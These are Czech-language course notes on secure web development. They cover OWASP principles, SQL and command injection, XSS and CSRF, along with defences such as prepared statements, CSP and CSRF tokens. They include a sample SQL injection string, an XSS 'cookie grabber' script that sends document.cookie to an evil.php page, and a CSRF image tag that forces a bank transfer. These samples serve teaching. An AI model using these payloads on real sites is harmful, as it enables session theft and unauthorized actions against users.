# 18 - Principy bezpečného vývoje
## Základy bezpečného vývoje
## Proč je bezpečnost důležitá

**Dopady incidentů**: Únik dat, finanční ztráty, právní problémy  
**Náklady**: **Oprava** po útoku je **výrazně dražší** než prevence během vývoje  
**Reputace**: **Ztráta důvěry** uživatelů může být dlouhodobá nebo nevratná

### Hlavní principy bezpečného vývoje
**Security by Design**: Bezpečnost řešíš už při návrhu systému, ne až jako „doplněk“ na konci  
**Defense in Depth**: Více vrstev ochrany – když selže jedna, další stále chrání systém  
**Principle of Least Privilege**: Každý uživatel i komponenta má jen ta oprávnění, která nutně potřebuje  
**Fail Secure**: Když systém selže, měl by zůstat v bezpečném stavu

### OWASP Top 10 ([2025 edition](https://owasp.org/Top10/2025/))

**Seznam nejčastějších webových zranitelností**
- Používá se jako standard pro bezpečnostní audit
- Pomáhá pochopit:
  - Kde jsou největší rizika
  - Jaké útoky jsou nejčastější
  - Jak se proti nim bránit

---

# Injection útoky

## [SQL injection](./08%20-%20databáze.md#sql-injection)

### Princip
Útočník **vloží SQL kód do query** a **změní tím chování** databázového dotazu
- Co může udělat
  - Obejít přihlášení
  - Získat nebo upravit data
  - Smazat databázi

1. Útočník vloží SQL kód do vstupu:
    - ```sql
      SELECT * FROM users WHERE name = '<input>';
      ```
2. Útočník vloží: `Franta' OR 1=1 OR name = 'Pepa`
3. Query pak vypadá:
    - ```sql
      SELECT * FROM users WHERE name = 'Franta' OR 1=1 OR name = 'Pepa'`
      ```
    - Výsledek: Přečte celou databázi

### Ochrana

#### **Prepared statements**

Dovoluje "předkompilovat" query pro oddělení dat a samotného query
- ```sql
  SELECT * FROM users WHERE name = ?;
  ```
  - `?` je placeholder pro data

#### **Validace vstupů**

Kontrola délky  
**Povolené znaky**: Zakáže např. `;`, `=`, ... pro zabránění SQL injekcí  
**Typ dat** (číslo vs text)

### Typy
**Classic**: Přímo vidíš výsledek  
**Blind**: Odpověď neobsahuje data, ale dá se odvodit  
**Time-based**: Reakce serveru podle času

## Commandline Injection

Útočník **vloží systémový příkaz** (např. do shellu), který se následně **vykoná na serveru**

**Rizika**
- Spuštění škodlivých příkazů
- Přístup k systému
- Kompromitace serveru


**Ochrana**
- Ideálně vůbec **nespouštět** shell příkazy
- Používat **whitelist vstupů**
- Escapovat speciální znaky
- Používat bezpečné API místo shellu

---

# XSS - **C**ross-**S**ite **S**cripting

Útočník dostane **škodlivý JavaScript do stránky**, kterou si **zobrazí jiný uživatel**
- Aplikace **věří vstupu** a vrátí ho **bez úpravy zpět do HTML**


## Reflected XSS
- Skript je součástí URL nebo requestu
- Server ho „odrazí“ zpět v odpovědi

Cookie grabber:
```html
<script type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</script>
```

## Stored XSS
Škodlivý kód je **uložen na serveru** (např. komentář)
- Spustí se každému, kdo stránku navštíví

## DOM-based XSS
Chyba je čistě na straně klienta (JavaScript)
- Manipulace s DOM bez validace

## Dopady XSS
Krádež session cookies  
Převzetí účtu  
Přesměrování uživatele  
Úprava obsahu stránky (defacement)  
Keylogging


## Ochrana
**Output encoding**: Escapování znaků podle kontextu (HTML, JS, URL)  
**Content Security Policy** (CSP): Omezuje, odkud lze načítat skripty
- Výrazně snižuje dopad XSS

**HttpOnly cookies**: JavaScript nemůže číst cookies -> ochrana session  
**Validace a sanitizace vstupů**: Whitelist přístup
- Odstraňování nebezpečných tagů

---

# CSRF - Cross-Site Request Forgery
[OWASP](https://owasp.org/www-community/attacks/csrf#)

**Provedení akce jménem přihlášeného uživatele**
- Zneužití důvěry serveru v uživatele
- Útoky přes odkazy, obrázky, formuláře


**Typický scénář**
1. Uživatel je přihlášený (má session cookie)
2. Navštíví škodlivou stránku
3. Ta odešle request na cílový server
4. Server to bere jako legitimní akci

**Příklad**
```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```
- Prohlížeč automaticky přiloží cookies -> převod proběhne

## Ochrana proti CSRF
**CSRF tokeny**: Unikátní token v každém formuláři
- server kontroluje jeho platnost

**SameSite cookies**: Omezuje posílání cookies mezi weby
- `SameSite=Strict` nebo `Lax`

**Kontrola Referer / Origin**: Ověření, odkud request přišel  
**Re-autentizace**: Např. zadání hesla u citlivých operací
















